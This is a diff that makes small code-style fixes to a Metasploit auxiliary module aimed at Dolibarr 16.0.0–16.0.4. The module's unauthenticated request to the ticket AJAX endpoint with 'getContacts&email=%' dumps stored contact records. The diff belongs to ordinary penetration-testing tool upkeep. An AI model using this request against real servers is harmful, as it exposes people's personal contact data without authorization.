@@ -59,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_good("Response Code: #{res.code}")
     vprint_good("Response Body: #{res.body}")
 
-    /(Dolibarr|Login @|version=)\s*-*\s*(?<version>\d+.*\.\d+)/ =~ res.body
+    /version=(?<version>\d+.*\.\d+)/ =~ res.body
     version = Rex::Version.new(version)
     if version.between?(Rex::Version.new('16.0.0'), Rex::Version.new('16.0.4'))
       return [Exploit::CheckCode::Appears, version]
@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi!({
       'method' => 'GET',
       'uri' => normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')
-    }, timeout = 90, disconnect = true)
+    }, 90, true)
     vprint_line('--Exploit resquest--')
     vprint_line("Domain: #{vhost}")
     vprint_line("Target_URI: #{normalize_uri(target_uri.path, 'public', 'ticket', 'ajax', 'ajax.php?action=getContacts&email=%')}")
@@ -83,7 +83,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_line('--Exploit response--')
     begin
       res_json_document = res.get_json_document['contacts']
-    rescue
+    rescue StandardError
       return Exploit::CheckCode::Unknown
     end
 
@@ -126,7 +126,7 @@ class MetasploitModule < Msf::Auxiliary
         contact_entry.each_with_index do |element, index_element|
           begin
             contact_entry_data << res_json_document[num][element].to_s.gsub("\r\n", ' ')
-          rescue
+          rescue StandardError
             contact_entry_data << ' '
           end
           if index_element == contact_entry.length - 1
